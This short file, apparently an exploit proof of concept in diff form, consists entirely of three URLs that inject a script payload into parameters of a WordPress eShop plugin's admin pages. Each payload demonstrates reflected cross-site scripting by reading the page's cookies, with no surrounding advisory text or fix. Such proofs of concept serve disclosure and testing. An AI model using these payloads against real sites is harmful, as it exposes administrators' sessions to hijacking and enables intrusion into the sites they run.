@@ -1,0 +1,5 @@
+http://www.example.com/wp-admin/admin.php?page=eshop-templates.php&amp;eshoptemplate=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-admin/admin.php?page=eshop-orders.php&amp;view=1&amp;action=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-admin/admin.php?page=eshop-orders.php&amp;viewemail=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E 
